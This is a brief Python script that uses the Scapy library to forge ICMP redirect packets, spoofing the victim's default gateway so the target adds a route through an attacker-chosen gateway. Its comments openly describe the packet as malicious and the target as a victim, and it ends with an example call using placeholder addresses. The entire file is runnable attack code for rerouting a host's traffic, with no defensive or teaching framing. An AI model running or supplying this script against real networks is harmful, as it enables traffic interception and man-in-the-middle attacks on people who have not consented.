#!/usr/bin/env python
from scapy.all import *

def icmp_redirect(target, gateway, route_to_add, route_gw_to_add):
    conf.verb = 0

    print("Crafting Malicious Packet to update the Routing table")
    # creating a spoofed  IP packet to seem to originate from Default GW of host
    ip = IP()
    ip.dst = target              # Address where to update the routing table
    ip.src = gateway             # Original router on the network

    # creating ICMP redirect packet with the new gateway address.
    icmp = ICMP()
    icmp.type = 5               # 5 for Redirect message.
    icmp.code = 1               # code 1 for host route.
    icmp.gw = route_gw_to_add   # Malicious gateway entry

    # Adding dummy packet with ICMP redirect which will update Route entry.
    ip2 = IP()
    ip2.src = target            # Address of the victim
    ip2.dst = route_to_add      # Entry to be added up with gw value of ICMP

    udp = UDP()
    print("Sending the malicious packet to %s to update its route table with %s" % (target, route_to_add))
    send(ip / icmp / ip2 / udp)

# Example usage:
icmp_redirect("victim_ip", "gateway_ip", "route_to_add", "route_gateway")
